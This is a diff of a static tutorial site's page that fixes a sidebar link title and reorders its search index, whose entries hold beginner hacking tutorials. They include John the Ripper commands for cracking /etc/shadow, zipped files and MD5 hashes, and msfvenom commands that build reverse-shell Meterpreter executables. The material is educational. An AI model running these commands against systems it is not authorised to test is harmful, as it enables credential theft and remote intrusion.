@@ -99,7 +99,7 @@
                                     
                                         
                                         
-                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/john-the-ripper/john-the-ripper/introduction_to_john_the_ripper/"></a></li>
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/john-the-ripper/john-the-ripper/introduction_to_john_the_ripper/">Using John The Ripper</a></li>
                                         
                                     
                                 </ul>
@@ -1299,15 +1299,6 @@
     index.add(
             {
                 id:  1 ,
-                href: "\/tutorials\/docs\/john-the-ripper\/john-the-ripper\/introduction_to_john_the_ripper\/",
-                title: "",
-                description: "One of the most famous and powerful tool for password cracking is John the Ripper.\nJohn the Ripper is the tool that is used by most of the ethical hackers to perform dictionary attacks for password cracking. In this section, you will learn what is John the Ripper, How to use John the Ripper, How John the Ripper password cracker works and practical tutorial on John the Ripper usage.\nWhat is John the Ripper?",
-                content: "One of the most famous and powerful tool for password cracking is John the Ripper.\nJohn the Ripper is the tool that is used by most of the ethical hackers to perform dictionary attacks for password cracking. In this section, you will learn what is John the Ripper, How to use John the Ripper, How John the Ripper password cracker works and practical tutorial on John the Ripper usage.\nWhat is John the Ripper? linkJohn the Ripper is the name of the password cracker tool that is developed by Openwall. As the name, It is used to crack password hashes by using its most popular inbuilt program, rules and codes that are also an individual password cracker itself in a single package.\nIt automatically detects types of password hashes, you can also customize this tool according to your wish. It can be used to crack password-protected compressed files like Zip, Rar, Doc, pdf etc.\nThe penetration testers, ethical hackers, security experts and other Cyber Security professionals use this tool to find weak algorithms and then make them strong so that they can’t be hacked.\nSecurity professionals build their confidential files with a strong hash algorithm to prevent external unauthorized access. Hackers used it to crack multiple accounts and simply crack their credentials. Security experts use it to strengthen their encryption. It can also be used for hacking shells and passwords SHA-crypt hashes It provides a mangling feature which is a preprocessor in JTR that optimizes the word list to make the password cracking process faster. Understanding Hash Functions linkHashing is the process of converting an input of any length into a fixed-size string of text using the mathematical function (Hash Function) i.e, any text no matter how long it is can be converted into any random combination of numbers and alphabets through an algorithm\nHash function example Let’s understand hashing process with a real-life example. The best example is how our system password stores in the database.\nWithout Hashing Algorithm linkWhenever you set a password it will directly store in the database as a text file that may be read easily if the system compromised. It will save your password in a plain file as the same string you entered. Check the below image with syntax and example\nWith Hashing Algorithm linkWhenever you set your password it will take your password as an input string and with the help of hashing function, it converts that password into a hash (random combination of number and alphabet) and stores it in the database. It enhances security by encrypting input strings. It will save your password in a different format so no one can read it even if your system compromise.\nTypes of Hashing Algorithms linkJohn the Ripper tool are able to perform various attacks and crack a lot of hash formats such as:\nMD2 CRC32 SHA-1 SHA-256 MD5 RipeMD128 Adler32 Tiger You can check the formats that supports with the following command on your terminal:\njohn --list=formats How JRP Works? linkThe main objective of John the Ripper is to crack the password. There are many ways that can be supported but it is mainly known for Dictionary attacks. However, you can also run other types of attacks like Bruteforce attack, Rainbow Table etc.\nDictionary attack: This is the popular and most usable attack in the JTR (John the Ripper) password cracker tool where we used pre-defined words or a list of words that can be used to crack the password. This attack uses the words from the wordlist (A text file having pre-defined words) and matches every single word from the list with a password to crack in sequence.\nBrute-force attack: If you are using this attack then you have to do the configuration of few things before its use such as the defining minimum and maximum lengths of the password, defining possible characters that you want to test during the cracking process like (special characters, alphabets and numbers).\nFor Example, The matching string that you are using for cracking passwords should include uppercase alphabets, special characters and numbers like ABC32@$\nThe user gets a password on the successful match, but this effective process is slow. for example, a 10-character password including upper and lower letters along with numbers and special characters will take over 10 years to be guessed by a computer\nGetting John The Ripper linkIt was developed for Unix Operating systems and was only work on Linux based systems but now available for all platforms such as Windows, BSD, Mac.\nIn Kali Linux John the Ripper is already available under password cracking metapackages, so you don’t need to download it.\nYou can download John the Ripper password cracker from the official website Openwall.\nIf you are using different Linux distributions like Ubuntu, Fedora, Arch etc. then you can install it by running the below single command the difference in command only will be the package manager i.e, for Ubuntu you use apt, Arch uses Pacman and Redhat uses yum.\nsudo apt-get install john How to Use John the Ripper linkUsing this password cracker tool is very easy and straightforward, you just need to type john followed by the hash file that you want to crack and then just define the format of the hash and hit enter.\njohn hash.txt --format=RAW-MD5 In the above picture, you can see lots of supported formats, You can do various things with this tool such as using wordlists, rules, modes, options, decrypting formats etc, We will see below how to use these various things in this tool\nCracking Zip File linkAssume you have a zip file that is password protected called protected.zip. We can use John The Ripper to crack the password. We first need to generate a hash of the zip file. You can use the below command and will generate the hash value into a hash.txt file.\nsudo zip2john protected.zip \u003e hash.txt So now we have a hash of our zip file that we will use to crack the password. In the below command we use the format option to specify the zip file and then the hash.txt file where we store our hash value.\nsudo john --format=zip hash.txt This should complete and return the password which you can then use to open the zip file.\nCracking MD5 Password linkIn this example I am generating a hash by using md5 hash generator to show you how to crack MD5 formatted files password. In the below image you can see I have generated the hash of the 12345 string. You can copy the MD5 hash to perform the same practical\nhttps://i.imgur.com/Sp4Vm3j.png\nWe used the string 123456789. The MD5 hash is 25f9e794323b453885f5181f1b624d0b and the SHA1 f7c3bc1d808e04732adf679965ccc34ca7ae3441.\nNow you can create a .txt file and put the MD5 hash using the following commands.\nWe can now crack the password by running the following command\njohn hash.txt --format=RAW-MD5 https://i.imgur.com/ekzjIHz.png\nYou can see, we get the string back as 123456789.\nCracking Linux Password linkWhen we create a password of the Linux system it stores in /etc/shadow location in encrypted form i.e, like a hash. So cracking a Linux password is easy with just a single command that is given below.\nsudo john /etc/shadow Now we know what is John the Ripper, How to use John the Ripper, How John the Ripper password cracker works, How passwords can be cracked and also a tutorial on its real-life important uses, but this not get over yet there are lots of other things that can be done by JTR.\nRemenber if the password is long it will also take long time to crack.\n"
-            }
-        );
-    index.add(
-            {
-                id:  2 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/introduction\/",
                 title: "A Getting Started Guide To Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1316,7 +1307,7 @@
         );
     index.add(
             {
-                id:  3 ,
+                id:  2 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/introduction_to_metasploit\/",
                 title: "An Introduction to Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1325,7 +1316,7 @@
         );
     index.add(
             {
-                id:  4 ,
+                id:  3 ,
                 href: "\/tutorials\/docs\/nmap\/nmap\/an_introduction_to_nmap\/",
                 title: "An Introduction To Nmap",
                 description: "Learn more about the Nmap",
@@ -1334,7 +1325,7 @@
         );
     index.add(
             {
-                id:  5 ,
+                id:  4 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/bash_scripting\/",
                 title: "Bash Scripting in Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1343,7 +1334,7 @@
         );
     index.add(
             {
-                id:  6 ,
+                id:  5 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/conducting_a_discovery_scan\/",
                 title: "Conducting a Discovery Scan in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1352,7 +1343,7 @@
         );
     index.add(
             {
-                id:  7 ,
+                id:  6 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/database_support\/",
                 title: "Database Support in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1361,7 +1352,7 @@
         );
     index.add(
             {
-                id:  8 ,
+                id:  7 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/hashing_and_password_cracking\/",
                 title: "Hashing and Password cracking in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1370,7 +1361,7 @@
         );
     index.add(
             {
-                id:  9 ,
+                id:  8 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/shell_metasploit\/",
                 title: "How to Use a Reverse Shell in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1379,7 +1370,7 @@
         );
     index.add(
             {
-                id:  10 ,
+                id:  9 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/running_modules_using_metasploit\/",
                 title: "Introduction to Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1388,7 +1379,7 @@
         );
     index.add(
             {
-                id:  11 ,
+                id:  10 ,
                 href: "\/tutorials\/docs\/john-the-ripper\/",
                 title: "John The Ripper",
                 description: "Learn more about John The Ripper",
@@ -1397,7 +1388,7 @@
         );
     index.add(
             {
-                id:  12 ,
+                id:  11 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/",
                 title: "Linux Basics for Hackers",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1406,7 +1397,7 @@
         );
     index.add(
             {
-                id:  13 ,
+                id:  12 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/managing_sessions\/",
                 title: "Managing Sessions in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1415,7 +1406,7 @@
         );
     index.add(
             {
-                id:  14 ,
+                id:  13 ,
                 href: "\/tutorials\/docs\/metasploit\/",
                 title: "Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1424,7 +1415,7 @@
         );
     index.add(
             {
-                id:  15 ,
+                id:  14 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/networking_in_kali\/",
                 title: "Networking in Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1433,7 +1424,7 @@
         );
     index.add(
             {
-                id:  16 ,
+                id:  15 ,
                 href: "\/tutorials\/docs\/nmap\/",
                 title: "Nmap",
                 description: "Learn more about the Nmap",
@@ -1442,7 +1433,7 @@
         );
     index.add(
             {
-                id:  17 ,
+                id:  16 ,
                 href: "\/tutorials\/docs\/nmap\/nmap\/cheat_sheet\/",
                 title: "Nmap Cheat-Sheet: Scanning Types, Commands, and NSE Scripts",
                 description: "Learn more about the Nmap",
@@ -1451,7 +1442,7 @@
         );
     index.add(
             {
-                id:  18 ,
+                id:  17 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/text_manipulation\/",
                 title: "Text Manipulation",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1460,7 +1451,7 @@
         );
     index.add(
             {
-                id:  19 ,
+                id:  18 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/file_permision_using_linux\/",
                 title: "Understanding File Permissions in Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1469,11 +1460,20 @@
         );
     index.add(
             {
-                id:  20 ,
+                id:  19 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/payloads_in_metasploit\/",
                 title: "Understanding How Payloads Work in Metasploit",
                 description: "Learn more about the Metasploit framework.",
                 content: "Understanding How Payloads Work in Metasploit linkThe Metasploit Framework is a powerful tool used for developing, testing, and executing exploits against remote targets. One of the critical components in this process is the payload. This blog post aims to break down the functionality of payloads in Metasploit, explaining their types and how they are used.\nWhat are Payloads? linkIn Metasploit, payloads are modules that are used to execute code on a target system. They are stored in the directory modules/payloads/{singles, stages, stagers}/. When the framework starts, it combines stages with stagers to create a complete payload ready for use in exploits. Handlers are then paired with these payloads to manage the sessions and communication mechanisms.\nNaming Conventions linkPayloads in Metasploit are given reference names that describe their components:\nStaged payloads: /[arch]// Single payloads: /[arch]/ For example, the payload windows/x64/meterpreter/reverse_tcp breaks down as follows:\nPlatform: Windows Architecture: x64 Stage: Meterpreter Stager: Reverse TCP In some cases, the architecture might be optional. For instance, php/meterpreter/reverse_tcp does not include an architecture because PHP payloads deliver interpreted code rather than native binaries.\nTypes of Payloads linkSingles linkSingle payloads are “fire-and-forget.” They execute the payload code immediately without requiring any further communication with the Metasploit framework. This type of payload is useful in scenarios where the target has no network access, such as when using a file format exploit delivered via a USB drive.\nStagers linkStagers are small payloads designed to establish a communication channel and then load a larger, more complex payload. Using a stager allows for the initial payload to be small and quick to execute, which is useful for bypassing size restrictions and avoiding detection. The stager sets up the communication channel and passes control to the next stage, which is the more significant part of the payload.\nStages linkStages are the larger payloads that the stager loads into memory. They can be arbitrarily large since the stager handles any size restrictions. This allows stages to be written in higher-level languages like C, providing more functionality and complexity in the final payload.\nDelivering Staged Payloads linkWhen delivering staged payloads, the IP address and port that the payload should connect back to are embedded in the stager. All staged payloads consist of a small stub that sets up communication and executes the next stage.\nTo create an executable using a staged payload, you would use the following commands in Metasploit’s msfvenom:\nmsfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp These commands create functionally identical executable files that differ only in randomization elements, making them unique.\nCommunication Mechanisms linkThe Ruby side of Metasploit acts as a client, using the transport mechanism set up by the stager (e.g., TCP, HTTP, HTTPS). Depending on the type of stage used:\nShell Stage: Metasploit connects the remote process’s standard input/output to your terminal. Meterpreter Stage: Metasploit communicates using the Meterpreter protocol, offering more advanced features like file system navigation and command execution. Conclusion linkUnderstanding how payloads work in Metasploit is crucial for effectively using the framework to exploit and manage remote systems. By combining singles, stagers, and stages, Metasploit allows for flexible and powerful payload delivery, making it a versatile tool for penetration testers and security professionals.\nBy mastering the components and delivery methods of Metasploit payloads, you can leverage the full capabilities of this powerful framework in your security assessments and exploit development.\n"
+            }
+        );
+    index.add(
+            {
+                id:  20 ,
+                href: "\/tutorials\/docs\/john-the-ripper\/john-the-ripper\/introduction_to_john_the_ripper\/",
+                title: "Using John The Ripper",
+                description: "Learn how to use John The Ripper to crack passwords.",
+                content: "One of the most famous and powerful tool for password cracking is John the Ripper.\nJohn the Ripper is the tool that is used by most of the ethical hackers to perform dictionary attacks for password cracking. In this section, you will learn what is John the Ripper, How to use John the Ripper, How John the Ripper password cracker works and practical tutorial on John the Ripper usage.\nWhat is John the Ripper? linkJohn the Ripper is the name of the password cracker tool that is developed by Openwall. As the name, It is used to crack password hashes by using its most popular inbuilt program, rules and codes that are also an individual password cracker itself in a single package.\nIt automatically detects types of password hashes, you can also customize this tool according to your wish. It can be used to crack password-protected compressed files like Zip, Rar, Doc, pdf etc.\nThe penetration testers, ethical hackers, security experts and other Cyber Security professionals use this tool to find weak algorithms and then make them strong so that they can’t be hacked.\nSecurity professionals build their confidential files with a strong hash algorithm to prevent external unauthorized access. Hackers used it to crack multiple accounts and simply crack their credentials. Security experts use it to strengthen their encryption. It can also be used for hacking shells and passwords SHA-crypt hashes It provides a mangling feature which is a preprocessor in JTR that optimizes the word list to make the password cracking process faster. Understanding Hash Functions linkHashing is the process of converting an input of any length into a fixed-size string of text using the mathematical function (Hash Function) i.e, any text no matter how long it is can be converted into any random combination of numbers and alphabets through an algorithm\nHash function example Let’s understand hashing process with a real-life example. The best example is how our system password stores in the database.\nWithout Hashing Algorithm linkWhenever you set a password it will directly store in the database as a text file that may be read easily if the system compromised. It will save your password in a plain file as the same string you entered. Check the below image with syntax and example\nWith Hashing Algorithm linkWhenever you set your password it will take your password as an input string and with the help of hashing function, it converts that password into a hash (random combination of number and alphabet) and stores it in the database. It enhances security by encrypting input strings. It will save your password in a different format so no one can read it even if your system compromise.\nTypes of Hashing Algorithms linkJohn the Ripper tool are able to perform various attacks and crack a lot of hash formats such as:\nMD2 CRC32 SHA-1 SHA-256 MD5 RipeMD128 Adler32 Tiger You can check the formats that supports with the following command on your terminal:\njohn --list=formats list\nHow JRP Works? linkThe main objective of John the Ripper is to crack the password. There are many ways that can be supported but it is mainly known for Dictionary attacks. However, you can also run other types of attacks like Bruteforce attack, Rainbow Table etc.\nDictionary attack: This is the popular and most usable attack in the JTR (John the Ripper) password cracker tool where we used pre-defined words or a list of words that can be used to crack the password. This attack uses the words from the wordlist (A text file having pre-defined words) and matches every single word from the list with a password to crack in sequence.\nBrute-force attack: If you are using this attack then you have to do the configuration of few things before its use such as the defining minimum and maximum lengths of the password, defining possible characters that you want to test during the cracking process like (special characters, alphabets and numbers).\nFor Example, The matching string that you are using for cracking passwords should include uppercase alphabets, special characters and numbers like ABC32@$\nThe user gets a password on the successful match, but this effective process is slow. for example, a 10-character password including upper and lower letters along with numbers and special characters will take over 10 years to be guessed by a computer\nGetting John The Ripper linkIt was developed for Unix Operating systems and was only work on Linux based systems but now available for all platforms such as Windows, BSD, Mac.\nIn Kali Linux John the Ripper is already available under password cracking metapackages, so you don’t need to download it.\nYou can download John the Ripper password cracker from the official website Openwall.\nIf you are using different Linux distributions like Ubuntu, Fedora, Arch etc. then you can install it by running the below single command the difference in command only will be the package manager i.e, for Ubuntu you use apt, Arch uses Pacman and Redhat uses yum.\nsudo apt-get install john How to Use John the Ripper linkUsing this password cracker tool is very easy and straightforward, you just need to type john followed by the hash file that you want to crack and then just define the format of the hash and hit enter.\njohn hash.txt --format=RAW-MD5 In the above picture, you can see lots of supported formats, You can do various things with this tool such as using wordlists, rules, modes, options, decrypting formats etc, We will see below how to use these various things in this tool\nCracking Zip File linkAssume you have a zip file that is password protected called protected.zip. We can use John The Ripper to crack the password. We first need to generate a hash of the zip file. You can use the below command and will generate the hash value into a hash.txt file.\nsudo zip2john protected.zip \u003e hash.txt So now we have a hash of our zip file that we will use to crack the password. In the below command we use the format option to specify the zip file and then the hash.txt file where we store our hash value.\nsudo john --format=zip hash.txt This should complete and return the password which you can then use to open the zip file.\nCracking MD5 Password linkIn this example I am generating a hash by using md5 hash generator to show you how to crack MD5 formatted files password. In the below image you can see I have generated the hash of the 12345 string. You can copy the MD5 hash to perform the same practical\nhttps://i.imgur.com/Sp4Vm3j.png\nWe used the string 123456789. The MD5 hash is 25f9e794323b453885f5181f1b624d0b and the SHA1 f7c3bc1d808e04732adf679965ccc34ca7ae3441.\nNow you can create a .txt file and put the MD5 hash using the following commands.\nWe can now crack the password by running the following command\njohn hash.txt --format=RAW-MD5 https://i.imgur.com/ekzjIHz.png\nYou can see, we get the string back as 123456789.\nCracking Linux Password linkWhen we create a password of the Linux system it stores in /etc/shadow location in encrypted form i.e, like a hash. So cracking a Linux password is easy with just a single command that is given below.\nsudo john /etc/shadow Now we know what is John the Ripper, How to use John the Ripper, How John the Ripper password cracker works, How passwords can be cracked and also a tutorial on its real-life important uses, but this not get over yet there are lots of other things that can be done by JTR.\nRemenber if the password is long it will also take long time to crack.\n"
             }
         );
     search.addEventListener('input', show_results, true);
